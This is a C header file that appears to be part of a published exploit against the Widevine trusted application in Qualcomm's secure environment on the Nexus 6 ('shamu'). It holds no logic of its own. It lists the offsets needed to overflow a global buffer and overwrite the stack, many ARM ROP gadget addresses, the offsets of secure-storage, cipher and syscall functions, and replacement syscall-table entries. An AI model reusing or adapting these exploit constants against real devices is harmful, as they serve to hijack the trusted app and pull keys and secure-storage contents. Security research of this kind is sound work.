#ifndef __SYMBOLS_H__
#define __SYMBOLS_H__

/**
 * The offset of the data region in the widevine application
 */
#define DATA_SEGMENT_OFFSET (0x2D000)

/**
 * The size of the data segment in the widevine application
 */
#define DATA_SEGMENT_SIZE   (0x177B7)

/**
 * The start address of the secure app region (on shamu)
 */
#define SECURE_APP_REGION_START (0xD600000)

/**
 * The size of the secure app region
 */
#define SECURE_APP_REGION_SIZE (0x500000)

/** 
 * The end address of the secure app region
 */
#define SECURE_APP_REGION_END (SECURE_APP_REGION_START + SECURE_APP_REGION_SIZE)

/**
 * The offset of the stack top in the overflow function from the beginning of the overflow buffer
 */
#define STACK_OVERWRITE_OFFSET (0x587*4)

/**
 * The size needed when overwriting to reach the original stack.
 */
#define STACK_OVERWRITE_SIZE (0x27E4)

/**
 * The offset of the stack top from the start of the data region.
 */
#define STACK_TOP_OFFSET (0x2FB8)

/**
 * The start offset, in bytes, in the global buffer, in which the overflow starts
 */
#define START_OVERFLOW_OFFSET (0x10FC)

/**
 * the start offset, in bytes, of the WV session pointers within the global buffer
 */
#define WV_SESSION_OFFSET (0x169C)

/**
 * The probe offset at which the OEMCrypto_DeriveKeysFromSessionKey function attempts
 * to read a DWORD, starting at the session pointer.
 */
#define DERIVE_KEY_PROBE_OFFSET (0xDA)

/**
 * The offset at which the nonce is generated into the session pointer
 */
#define NONCE_GENERATION_OFFSET (0x88)

/**
 * The calculated top of the stack offset from the data segment start.
 */
#define CALC_STACK_TOP_OFFSET (0x278C)

/**
 * The offset of the return address from the "widevine_handle_cmd" from the image base.
 */
#define HANDLE_CMD_RET_OFFSET (0xB52 + 1)

/**
 * The offset of the "MOV R0, 0; BX LR;" from the widevine image start address
 */
#define MOV_R0_0_BX_LR_OFFSET (0x68 + 1)

/**
 * the offset of the "ADD SP, SP, #8; POP {R4, R5, R6, PC}" gadget from the image base.
 */
#define ADD_SP_SP_8_POP_R4_R5_R6_PC_OFFSET (0x1E2D0)

/**
 * The offset of the "POP {R1, R4, IP, SP, PC}" gadget from the image base.
 */
#define POP_R1_R4_IP_SP_PC_OFFSET (0x2292C)

/**
 * The offset of the "POP {R0, R1, R3, PC}" gadget from the image base.
 */
#define POP_R0_R1_R3_PC_OFFSET (0x26CA6 + 1)

/**
 * The offset of the "POP {R0, R2, R3, R4, PC}" gadget from the image base.
 */
#define POP_R0_R2_R3_R4_PC_OFFSET (0x2737C + 1)

/**
 * The offset of the "POP {R4, R6, R9, FP, IP, PC}" gadget from the image base.
 */
#define POP_R4_R6_R9_FP_IP_PC_OFFSET (0x1E156 + 1)

/**
 * The offset of the "POP {R4, R5, R6, LR}; BX IP;" gadget from the image base.
 */
#define POP_R4_R5_R6_LR_BX_IP_OFFSET (0x29A0)

/**
 * The offset of the "POP {R1, R3, R5, R7, PC}" gadget from the image base.
 */
#define POP_R1_R3_R5_R7_PC_OFFSET (0x26D94 + 1)

/**
 * The offset of the "STR R0, [R1, #520]; POP {R4, R5, R6, PC};" gadget from the image base.
 */
#define STR_R0_R1_520_POP_R4_R5_R6_PC_OFFSET (0x1F26A + 1)

/**
 * The offset of the "LDMDB R0!, {R4, IP, SP, LR, PC}" gadget from the image base.
 */
#define LDMDB_R0_R4_IP_SP_LR_PC_OFFSET (0x14258)

/**
 * The return address from the main command handling loop
 */
#define MAIN_LOOP_RET_OFFSET (0xBD2 + 1)

/**
 * The offset of the "POP {PC}" gadget from the image base.
 */
#define POP_PC_OFFSET (0x24BDC + 1)

/**
 * The offset of the "LDM R0, {R0, R2, R3, IP, SP, LR, PC}" gadget from the image base.
 */
#define LDM_R0_R0_R2_R3_IP_SP_LR_PC_OFFSET (0x17398)

/**
 * The offset of the "STR R0, [R1]; BX LR;" gadget from the image base.
 */
#define STR_R0_R1_BX_LR_OFFSET (0xE16 + 1)

/**
 * The offset of the "MOV R0, #6; BX LR;" gadget from the image base.
 */
#define RET_6_OFFSET (0x21f70 + 1)

/**
 * The offset of the "LDR R0, [R1, #0]; BX LR" gadget from the image base.
 */
#define LDR_R0_R1_BX_LR_OFFSET (0x24BBA + 1)

/**
 * The offset of the read_dword function pointer from the image base.
 */
#define READ_DWORD_OFFSET (0x24828 + 1)

/**
 * The offset of the write_dword function pointer from the image base.
 */
#define WRITE_DWORD_OFFSET (0x2483E + 1)

/**
 * The offset of the "STR R0, [R2]; BX LR" gadget from the image base.
 */
#define STRB_R0_R2_BX_LR_OFFSET (0x24BFA + 1)

/**
 * The offset of the malloc function from the image base.
 */
#define MALLOC_OFFSET (0xDE2 + 1)

/**
 * The offset of the qsee_sfs_open function from the image base.
 */
#define QSEE_SFS_OPEN_OFFSET (0x4C9C + 1)

/**
 * The offset of the qsee_sfs_read function from the image base.
 */
#define QSEE_SFS_READ_OFFSET (0x4CD6 + 1)

/**
 * The offset of the overwritten function pointer from the data segment start
 */
#define OVERWRITE_FUNCTION_POINTER_OFFSET (0x1B0)

/**
 * The offset of the qsee_syscall function from the image base.
 */
#define QSEE_SYSCALL_OFFSET (0x24E64)

/**
 * The offset of the qsee_cipher_set_param function from the image base.
 */
#define QSEE_CIPHER_SET_PARAM_OFFSET (0x8E4 + 1)

/**
 * The offset of the qsee_cipher_get_param function from the image base.
 */
#define QSEE_CIPHER_GET_PARAM_OFFSET (0x908 + 1)

//The entries in the replaced syscall table
#define SYSCALL_TABLE_5_ENTRY_0x2 (0xFE84FEC9)
#define SYSCALL_TABLE_5_ENTRY_0x3 (0xFE84FF35)
#define SYSCALL_TABLE_5_ENTRY_0x4 (0xFE80AD6D)
#define SYSCALL_TABLE_5_ENTRY_0x5 (0xFE80ADA3)
#define SYSCALL_TABLE_5_ENTRY_0x6 (0xFE811C6D)
#define SYSCALL_TABLE_5_ENTRY_0x7 (0xFE811CB5)
#define SYSCALL_TABLE_5_ENTRY_0x8 (0xFE8122D0)
#define SYSCALL_TABLE_5_ENTRY_0x9 (0xFE80A38D)
#define SYSCALL_TABLE_5_ENTRY_0xA (0xFE80ADE3)
#define SYSCALL_TABLE_5_ENTRY_0xB (0xFE849B49)
#define SYSCALL_TABLE_5_ENTRY_0xC (0xFE84964D)
#define SYSCALL_TABLE_5_ENTRY_0xD (0xFE8496E1)
#define SYSCALL_TABLE_5_ENTRY_0xE (0xFE84982B)
#define SYSCALL_TABLE_5_ENTRY_0xF (0xFE8495F1)


#endif
